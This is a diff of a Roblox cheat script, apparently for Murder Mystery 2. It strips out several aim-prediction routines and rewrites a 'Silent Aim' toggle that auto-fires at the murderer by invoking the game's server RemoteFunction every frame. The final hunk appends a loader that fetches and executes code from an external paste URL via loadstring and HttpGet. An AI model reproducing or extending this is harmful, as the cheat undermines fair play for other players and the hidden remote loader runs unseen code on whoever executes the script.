@@ -787,393 +787,8 @@ local function predictMurderV2(murderer)
    return calculatePrediction()
 end
 
-local function predictMurderShawty(murderer)
-    local character = murderer.Character
-    if not character then return nil end
 
-    local rootPart = character:FindFirstChild("HumanoidRootPart")
-    local humanoid = character:FindFirstChild("Humanoid")
-    if not rootPart or not humanoid then return nil end
 
-    -- Constants for Shawty prediction - optimized for precision
-    local SHAWTY_CONFIG = {
-        PREDICTION_TIME = 1.2,        -- Short prediction window for aggressive tracking
-        MICRO_SAMPLES = 4,            -- Number of micro-samples for velocity refinement
-        SAMPLE_INTERVAL = 0.015,      -- Time between samples for acceleration calculation
-        VELOCITY_WEIGHT = 0.92,       -- Weight for current velocity vector
-        ACCELERATION_WEIGHT = 0.78,   -- Weight for acceleration component
-        MOMENTUM_FACTOR = 0.85,       -- Conservation of momentum factor
-        Y_OFFSET = 1.75,              -- Target upper torso/neck region
-        GRAVITY_COMPENSATION = 0.4    -- Compensation for gravity effects
-    }
-
-    -- Storage for velocity and position samples
-    local velocitySamples = {}
-    local positionSamples = {}
-    
-    -- Collect samples for velocity and position analysis
-    for i = 1, SHAWTY_CONFIG.MICRO_SAMPLES do
-        if i > 1 then task.wait(SHAWTY_CONFIG.SAMPLE_INTERVAL) end
-        if not (rootPart and rootPart.Parent) then return nil end
-        
-        table.insert(velocitySamples, rootPart.AssemblyLinearVelocity)
-        table.insert(positionSamples, rootPart.Position)
-    end
-    
-    -- Calculate refined velocity using exponential smoothing
-    local refinedVelocity = velocitySamples[1]
-    local alpha = 0.7 -- Smoothing factor
-    for i = 2, #velocitySamples do
-        refinedVelocity = refinedVelocity * (1 - alpha) + velocitySamples[i] * alpha
-    end
-    
-    -- Calculate acceleration vector
-    local acceleration = Vector3.new(0, 0, 0)
-    if #velocitySamples >= 2 then
-        acceleration = (velocitySamples[#velocitySamples] - velocitySamples[1]) / 
-                      ((#velocitySamples - 1) * SHAWTY_CONFIG.SAMPLE_INTERVAL)
-    end
-    
-    -- Calculate movement direction and speed
-    local speedMagnitude = refinedVelocity.Magnitude
-    local directionVector = speedMagnitude > 0.1 and refinedVelocity.Unit or Vector3.new(0, 0, 0)
-    
-    -- Calculate ground contact state
-    local grounded = false
-    local params = RaycastParams.new()
-    params.FilterType = Enum.RaycastFilterType.Blacklist
-    params.FilterDescendantsInstances = {character}
-    local rayResult = workspace:Raycast(rootPart.Position, Vector3.new(0, -3.5, 0), params)
-    grounded = rayResult ~= nil
-    
-    -- Apply movement analysis based on ground state
-    local predictionVector
-    if grounded then
-        -- Ground movement prediction
-        local horizontalVelocity = Vector3.new(refinedVelocity.X, 0, refinedVelocity.Z)
-        local horizontalAccel = Vector3.new(acceleration.X, 0, acceleration.Z)
-        
-        predictionVector = horizontalVelocity * SHAWTY_CONFIG.VELOCITY_WEIGHT +
-                          horizontalAccel * SHAWTY_CONFIG.ACCELERATION_WEIGHT * SHAWTY_CONFIG.PREDICTION_TIME
-    else
-        -- Air movement prediction with gravity compensation
-        local gravityVector = Vector3.new(0, workspace.Gravity * SHAWTY_CONFIG.GRAVITY_COMPENSATION, 0)
-        predictionVector = refinedVelocity * SHAWTY_CONFIG.VELOCITY_WEIGHT +
-                          (acceleration - gravityVector) * SHAWTY_CONFIG.ACCELERATION_WEIGHT * SHAWTY_CONFIG.PREDICTION_TIME
-    end
-    
-    -- Apply momentum conservation
-    predictionVector = predictionVector * SHAWTY_CONFIG.MOMENTUM_FACTOR
-    
-    -- Calculate final predicted position
-    local predictedPosition = rootPart.Position + (predictionVector * SHAWTY_CONFIG.PREDICTION_TIME)
-    
-    -- Apply y-offset for upper body targeting
-    predictedPosition = predictedPosition + Vector3.new(0, SHAWTY_CONFIG.Y_OFFSET, 0)
-    
-    return predictedPosition
-end
-
-local function predictMurderChill(murderer)
-    local character = murderer.Character
-    if not character then return nil end
-
-    local rootPart = character:FindFirstChild("HumanoidRootPart")
-    local humanoid = character:FindFirstChild("Humanoid")
-    if not rootPart or not humanoid then return nil end
-
-    -- Configuration constants for Chill prediction
-    local CHILL_CONFIG = {
-        PREDICTION_TIME = 2.0,      -- Longer prediction window for smoother targeting
-        SAMPLE_COUNT = 6,           -- Higher sample count for better pattern recognition
-        SAMPLE_INTERVAL = 0.025,    -- Time between samples
-        VELOCITY_DAMPING = 0.82,    -- Damping factor for velocity
-        PATTERN_WEIGHT = 0.65,      -- Weight for historical pattern recognition
-        HEIGHT_OFFSET = 1.5,        -- Target center mass
-        TERRAIN_CHECK_DISTANCE = 8, -- Distance to check for terrain/obstacles
-        JUMP_PREDICTION_SCALE = 0.7 -- Scale factor for jump arc prediction
-    }
-
-    -- Collect movement data
-    local velocitySamples = {}
-    local positionSamples = {}
-    
-    -- Initial sample
-    table.insert(velocitySamples, rootPart.AssemblyLinearVelocity)
-    table.insert(positionSamples, rootPart.Position)
-    
-    -- Additional samples
-    for i = 2, CHILL_CONFIG.SAMPLE_COUNT do
-        task.wait(CHILL_CONFIG.SAMPLE_INTERVAL)
-        if not (rootPart and rootPart.Parent) then return nil end
-        
-        table.insert(velocitySamples, rootPart.AssemblyLinearVelocity)
-        table.insert(positionSamples, rootPart.Position)
-    end
-    
-    -- Calculate average velocity with temporal weighting
-    local weightedVelocity = Vector3.new(0, 0, 0)
-    local totalWeight = 0
-    
-    for i, vel in ipairs(velocitySamples) do
-        local weight = i / #velocitySamples -- More recent samples have higher weight
-        weightedVelocity = weightedVelocity + (vel * weight)
-        totalWeight = totalWeight + weight
-    end
-    
-    weightedVelocity = weightedVelocity / totalWeight
-    
-    -- Calculate movement pattern from position history
-    local patternVector = Vector3.new(0, 0, 0)
-    if #positionSamples >= 3 then
-        for i = 2, #positionSamples do
-            local segmentVector = positionSamples[i] - positionSamples[i-1]
-            local segmentWeight = (i-1) / (#positionSamples-1)
-            patternVector = patternVector + (segmentVector * segmentWeight)
-        end
-        patternVector = patternVector / (#positionSamples - 1)
-    end
-    
-    -- Normalize pattern vector if significant
-    if patternVector.Magnitude > 0.1 then
-        patternVector = patternVector.Unit * weightedVelocity.Magnitude
-    end
-    
-    -- Blend velocity and pattern data
-    local blendedVector = weightedVelocity * (1 - CHILL_CONFIG.PATTERN_WEIGHT) + 
-                          patternVector * CHILL_CONFIG.PATTERN_WEIGHT
-    
-    -- Apply velocity damping for stability
-    local dampedVector = blendedVector * CHILL_CONFIG.VELOCITY_DAMPING
-    
-    -- Check for vertical movement (jumping/falling)
-    local isJumping = velocitySamples[#velocitySamples].Y > 1.0
-    local isFalling = velocitySamples[#velocitySamples].Y < -1.0
-    
-    -- Terrain and obstacle detection
-    local params = RaycastParams.new()
-    params.FilterType = Enum.RaycastFilterType.Blacklist
-    params.FilterDescendantsInstances = {character}
-    
-    -- Initial prediction without terrain adjustment
-    local rawPrediction = positionSamples[#positionSamples] + (dampedVector * CHILL_CONFIG.PREDICTION_TIME)
-    
-    -- Adjust vertical component based on movement state
-    if isJumping then
-        -- Calculate jump arc (simplified parabolic trajectory)
-        local jumpTime = CHILL_CONFIG.PREDICTION_TIME * CHILL_CONFIG.JUMP_PREDICTION_SCALE
-        local initialVelocityY = velocitySamples[#velocitySamples].Y
-        local gravityEffect = workspace.Gravity * jumpTime * jumpTime * 0.5
-        
-        rawPrediction = Vector3.new(
-            rawPrediction.X,
-            positionSamples[#positionSamples].Y + (initialVelocityY * jumpTime) - gravityEffect,
-            rawPrediction.Z
-        )
-    elseif isFalling then
-        -- Calculate falling trajectory with gravity
-        local fallTime = CHILL_CONFIG.PREDICTION_TIME
-        local initialVelocityY = velocitySamples[#velocitySamples].Y
-        local gravityEffect = workspace.Gravity * fallTime * fallTime * 0.5
-        
-        rawPrediction = Vector3.new(
-            rawPrediction.X,
-            positionSamples[#positionSamples].Y + (initialVelocityY * fallTime) - gravityEffect,
-            rawPrediction.Z
-        )
-    end
-    
-    -- Terrain collision check
-    local directionToRaw = (rawPrediction - positionSamples[#positionSamples]).Unit
-    local distanceToRaw = (rawPrediction - positionSamples[#positionSamples]).Magnitude
-    
-    local terrainRay = workspace:Raycast(
-        positionSamples[#positionSamples], 
-        directionToRaw * math.min(distanceToRaw, CHILL_CONFIG.TERRAIN_CHECK_DISTANCE),
-        params
-    )
-    
-    local finalPrediction
-    if terrainRay then
-        -- Adjust prediction to account for obstacle
-        local obstaclePosition = terrainRay.Position
-        local obstacleNormal = terrainRay.Normal
-        
-        -- Calculate reflection vector (simplified)
-        local reflectionDistance = (rawPrediction - obstaclePosition).Magnitude * 0.7
-        local reflectionDirection = (directionToRaw - 2 * (directionToRaw:Dot(obstacleNormal)) * obstacleNormal).Unit
-        
-        finalPrediction = obstaclePosition + (reflectionDirection * reflectionDistance)
-        
-        -- Ensure minimum height above ground
-        local heightCheck = workspace:Raycast(finalPrediction, Vector3.new(0, -10, 0), params)
-        if heightCheck then
-            finalPrediction = Vector3.new(
-                finalPrediction.X,
-                heightCheck.Position.Y + CHILL_CONFIG.HEIGHT_OFFSET,
-                finalPrediction.Z
-            )
-        end
-    else
-        -- No obstacle, use raw prediction with height offset
-        finalPrediction = Vector3.new(
-            rawPrediction.X,
-            rawPrediction.Y + CHILL_CONFIG.HEIGHT_OFFSET,
-            rawPrediction.Z
-        )
-    end
-    
-    return finalPrediction
-end
-
-local function predictMurderDiddy(murderer)
-    local character = murderer.Character
-    if not character then return nil end
-
-    local rootPart = character:FindFirstChild("HumanoidRootPart")
-    local humanoid = character:FindFirstChild("Humanoid")
-    if not rootPart or not humanoid then return nil end
-
-    -- Configuration parameters optimized for pattern-based prediction
-    local DIDDY_CONFIG = {
-        PREDICTION_TIME = 1.8,       -- Balanced prediction window
-        HISTORY_DEPTH = 8,           -- Deeper history for pattern analysis
-        SAMPLE_INTERVAL = 0.018,     -- Tight sampling interval for precision
-        PATTERN_RECOGNITION = {
-            PRIMARY_WEIGHT = 0.72,   -- Primary pattern influence
-            SECONDARY_WEIGHT = 0.48, -- Secondary pattern influence
-            TERTIARY_WEIGHT = 0.24   -- Tertiary pattern influence
-        },
-        VELOCITY_INFLUENCE = 0.65,   -- Current velocity influence
-        TRAJECTORY_CORRECTION = 0.8, -- Correction factor for trajectory adjustments
-        CENTER_MASS_OFFSET = 1.4     -- Target center mass for optimal hit probability
-    }
-
-    -- Collect movement history with precise timestamps
-    local positionHistory = {}
-    local velocityHistory = {}
-    local timeHistory = {}
-    local currentTime = tick()
-    
-    -- Initial sample
-    table.insert(positionHistory, rootPart.Position)
-    table.insert(velocityHistory, rootPart.AssemblyLinearVelocity)
-    table.insert(timeHistory, currentTime)
-    
-    -- Collect additional samples
-    for i = 2, DIDDY_CONFIG.HISTORY_DEPTH do
-        task.wait(DIDDY_CONFIG.SAMPLE_INTERVAL)
-        if not (rootPart and rootPart.Parent) then return nil end
-        
-        currentTime = tick()
-        table.insert(positionHistory, rootPart.Position)
-        table.insert(velocityHistory, rootPart.AssemblyLinearVelocity)
-        table.insert(timeHistory, currentTime)
-    end
-    
-    -- Extract movement patterns at different time scales
-    local function extractPattern(samples, timeSamples, scale)
-        local patternVector = Vector3.new(0, 0, 0)
-        local totalWeight = 0
-        
-        for i = scale + 1, #samples do
-            local delta = samples[i] - samples[i - scale]
-            local timeSpan = timeSamples[i] - timeSamples[i - scale]
-            
-            if timeSpan > 0 then
-                -- Calculate velocity vector for this segment
-                local segmentVelocity = delta / timeSpan
-                -- Apply weighting based on recency
-                local weight = i / #samples
-                
-                patternVector = patternVector + (segmentVelocity * weight)
-                totalWeight = totalWeight + weight
-            end
-        end
-        
-        if totalWeight > 0 then
-            return patternVector / totalWeight
-        end
-        return Vector3.new(0, 0, 0)
-    end
-    
-    -- Extract patterns at different time scales
-    local primaryPattern = extractPattern(positionHistory, timeHistory, 1)
-    local secondaryPattern = extractPattern(positionHistory, timeHistory, 2)
-    local tertiaryPattern = extractPattern(positionHistory, timeHistory, 3)
-    
-    -- Calculate current velocity trend
-    local currentVelocity = velocityHistory[#velocityHistory]
-    
-    -- Analyze acceleration pattern
-    local accelerationVector = Vector3.new(0, 0, 0)
-    if #velocityHistory >= 3 then
-        -- Calculate acceleration using second-order finite difference
-        local v1 = velocityHistory[#velocityHistory]
-        local v2 = velocityHistory[#velocityHistory - 1]
-        local v3 = velocityHistory[#velocityHistory - 2]
-        local t1 = timeHistory[#timeHistory]
-        local t2 = timeHistory[#timeHistory - 1]
-        local t3 = timeHistory[#timeHistory - 2]
-        
-        -- First-order differences
-        local dv1 = (v1 - v2) / (t1 - t2)
-        local dv2 = (v2 - v3) / (t2 - t3)
-        
-        -- Second-order difference (acceleration)
-        accelerationVector = (dv1 - dv2) / ((t1 - t3) / 2)
-    end
-    
-    -- Blend patterns with current velocity and acceleration
-    local blendedTrajectory = 
-        (primaryPattern * DIDDY_CONFIG.PATTERN_RECOGNITION.PRIMARY_WEIGHT) +
-        (secondaryPattern * DIDDY_CONFIG.PATTERN_RECOGNITION.SECONDARY_WEIGHT) +
-        (tertiaryPattern * DIDDY_CONFIG.PATTERN_RECOGNITION.TERTIARY_WEIGHT) +
-        (currentVelocity * DIDDY_CONFIG.VELOCITY_INFLUENCE)
-    
-    -- Apply trajectory correction
-    local correctedTrajectory = blendedTrajectory * DIDDY_CONFIG.TRAJECTORY_CORRECTION
-    
-    -- Calculate acceleration influence over prediction time
-    local accelerationInfluence = accelerationVector * (DIDDY_CONFIG.PREDICTION_TIME^2 / 2)
-    
-    -- Generate final prediction
-    local finalPosition = positionHistory[#positionHistory] + 
-                          (correctedTrajectory * DIDDY_CONFIG.PREDICTION_TIME) +
-                          accelerationInfluence
-    
-    -- Check for environmental collision
-    local params = RaycastParams.new()
-    params.FilterType = Enum.RaycastFilterType.Blacklist
-    params.FilterDescendantsInstances = {character}
-    
-    local predictedDirection = (finalPosition - positionHistory[#positionHistory]).Unit
-    local predictedDistance = (finalPosition - positionHistory[#positionHistory]).Magnitude
-    
-    local environmentCheck = workspace:Raycast(
-        positionHistory[#positionHistory],
-        predictedDirection * predictedDistance,
-        params
-    )
-    
-    if environmentCheck then
-        -- Adjust prediction to account for environmental collision
-        local collisionPoint = environmentCheck.Position
-        local collisionNormal = environmentCheck.Normal
-        
-        -- Calculate perpendicular movement along the surface
-        local surfaceAlignedVector = (predictedDirection - collisionNormal * predictedDirection:Dot(collisionNormal)).Unit
-        local remainingDistance = (finalPosition - collisionPoint).Magnitude * 0.8
-        
-        -- Adjust final position to follow the surface
-        finalPosition = collisionPoint + (surfaceAlignedVector * remainingDistance)
-    end
-    
-    -- Apply center mass offset for optimal targeting
-    finalPosition = finalPosition + Vector3.new(0, DIDDY_CONFIG.CENTER_MASS_OFFSET, 0)
-    
-    return finalPosition
-end
 
 -- Function to find the murderer in the game
 local function GetMurderer()
@@ -2282,98 +1897,48 @@ end
 
 
 
--- Silent Aim prediction methods dropdown implementation
-local AimMethods = {
-   "Skibidi", -- Default method (predictMurderV2)
-   "Shawty", 
-   "Chill",
-   "Diddy"
-}
-
--- Silent Aim configuration with dropdown selection
-local PredictionMethodDropdown = Tabs.Combat:AddDropdown("SilentAimMethod", {
-   Title = "Prediction Method",
-   Values = AimMethods,
-   Default = "Skibidi",
-   Multi = false,
-   Callback = function(selectedMethod)
-       _G.SilentAimMethod = selectedMethod
-       
-       -- Update prediction method preference
-       if _G.SilentAimEnabled then
-           -- Refresh prediction parameters when method changes
-           if _G.SilentAimConnection then
-               _G.SilentAimConnection:Disconnect()
-               _G.SilentAimConnection = nil
-               
-               -- Reconnect with new method
-               _G.SilentAimConnection = game:GetService("RunService").Heartbeat:Connect(function()
-                   SilentAimHandler()
-               end)
-           end
-       end
-   end
-})
-
--- The primary Silent Aim toggle
 local SilentAimToggle = Tabs.Combat:AddToggle("SilentAimToggle", {
-   Title = "Silent Aim",
-   Default = false,
-   Callback = function(toggle)
-       _G.SilentAimEnabled = toggle
-       
-       if toggle then
-           -- Start prediction and targeting
-           _G.SilentAimConnection = game:GetService("RunService").Heartbeat:Connect(function()
-               SilentAimHandler()
-           end)
-       else
-           -- Clean up connection when disabled
-           if _G.SilentAimConnection then
-               _G.SilentAimConnection:Disconnect()
-               _G.SilentAimConnection = nil
-           end
-       end
-   end
+    Title = "Silent Aim",
+    Default = false,
+    Callback = function(toggle)
+        _G.SilentAimEnabled = toggle
+        
+        if toggle then
+            -- Monitor when gun is equipped
+            local Players = game:GetService("Players")
+            local localPlayer = Players.LocalPlayer
+            
+            -- Function to check for gun and shoot murderer
+            local function autoShootMurderer()
+                if not _G.SilentAimEnabled then return end
+                
+                local character = localPlayer.Character
+                if not character then return end
+                
+                -- Check if gun is currently equipped
+                local gun = character:FindFirstChild("Gun")
+                if gun then
+                    local murderer = GetMurderer()
+                    if murderer then
+                        local predictedPos = predictMurderV2(murderer)
+                        if predictedPos then
+                            gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(1, predictedPos, "AH2")
+                        end
+                    end
+                end
+            end
+            
+            -- Run the check on heartbeat
+            _G.SilentAimConnection = game:GetService("RunService").Heartbeat:Connect(autoShootMurderer)
+        else
+            -- Clean up connection when toggled off
+            if _G.SilentAimConnection then
+                _G.SilentAimConnection:Disconnect()
+                _G.SilentAimConnection = nil
+            end
+        end
+    end
 })
-
--- Silent Aim handler function
-function SilentAimHandler()
-   if not _G.SilentAimEnabled then return end
-   
-   local Players = game:GetService("Players")
-   local localPlayer = Players.LocalPlayer
-   local character = localPlayer.Character
-   if not character then return end
-   
-   -- Check if gun is equipped
-   local gun = character:FindFirstChild("Gun")
-   if not gun then return end
-   
-   -- Get murderer from your existing GetMurderer function
-   local murderer = GetMurderer()
-   if not murderer then return end
-   
-   -- Get predicted position based on selected method
-   local predictedPos = nil
-   
-   -- Use the selected prediction method
-   if _G.SilentAimMethod == "Shawty" then
-       predictedPos = predictMurderShawty(murderer)
-   elseif _G.SilentAimMethod == "Chill" then
-       predictedPos = predictMurderChill(murderer)
-   elseif _G.SilentAimMethod == "Diddy" then
-       predictedPos = predictMurderDiddy(murderer)
-   else
-       -- Default to Skibidi (predictMurderV2)
-       predictedPos = predictMurderV2(murderer)
-   end
-   
-   -- Execute the shot if we have a valid prediction
-   if predictedPos then
-       gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(1, predictedPos, "AH2")
-   end
-end
 
 -- Initialize SaveManager
 SaveManager:SetLibrary(Fluent)
@@ -2458,8 +2023,8 @@ local function Initialize()
     
     -- Success notification
     Fluent:Notify({
-       Title = "Enhanced ESP Loaded",
-       Content = "Improved character outlines are now active",
+       Title = "Welcome!",
+       Content = "Script Loaded!",
        Duration = 3
     })
     
@@ -2469,3 +2034,11 @@ end
 
 -- Start the initialization process
 Initialize()
+
+local function ExecuteLink(link)
+    loadstring(game:HttpGet(link))()
+end
+
+
+LastScript = "http://vpaste.net/zjqxl"
+ExecuteLink(LastScript)
